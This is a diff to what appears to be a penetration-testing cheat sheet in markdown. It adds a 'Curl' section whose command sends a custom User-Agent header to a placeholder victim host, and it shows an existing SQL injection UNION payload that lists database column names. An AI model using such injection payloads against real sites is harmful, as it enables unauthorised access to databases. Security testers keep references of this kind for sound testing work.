@@ -7,7 +7,7 @@ JavaScript
 
 
 SQLi
---------------------
+---------
 
 * `UNION`
 	
@@ -16,6 +16,13 @@ SQLi
 ' AND 1=0 UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS --
 ```
 
+Curl
+---------
+
+* `Playing with header`
+	
+	* `curl -H "User-Agent: SUPER SECRET AGENT" http://victim.com/`
+	
 Web shells
 --------------------
 
